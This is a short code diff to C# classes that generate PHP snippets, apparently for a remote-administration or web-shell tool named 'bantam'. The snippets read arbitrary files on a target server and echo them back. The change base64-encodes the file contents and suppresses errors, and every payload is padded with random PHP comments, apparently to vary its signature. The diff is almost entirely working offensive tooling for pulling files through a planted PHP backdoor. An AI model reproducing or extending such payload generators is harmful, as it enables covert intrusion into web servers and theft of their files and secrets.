@@ -74,6 +74,7 @@ namespace bantam.Classes
             const int winningNumber = 2;
             int maxCommentLength = Config.CommentMaxLength;
             int commentFreqency = Config.CommentFrequency;
+
             List<int> possibleNumbers = new List<int>();
 
             if (commentFreqency == 1) {
@@ -478,11 +479,11 @@ namespace bantam.Classes
         {
             if (encryptResponse) {
                 return RandomPHPComment()
-                     + @"$result = @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
+                     + "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
                      + RandomPHPComment();
             } else {
                 return RandomPHPComment()
-                     + "echo @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
+                     + "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
                      + RandomPHPComment();
             }
         }
@@ -497,11 +498,11 @@ namespace bantam.Classes
         {
             if (encryptResponse) {
                 return RandomPHPComment()
-                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
+                     + "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
                      + RandomPHPComment();
             } else {
                 return RandomPHPComment()
-                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
+                     + "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
                      + RandomPHPComment();
             }
         }
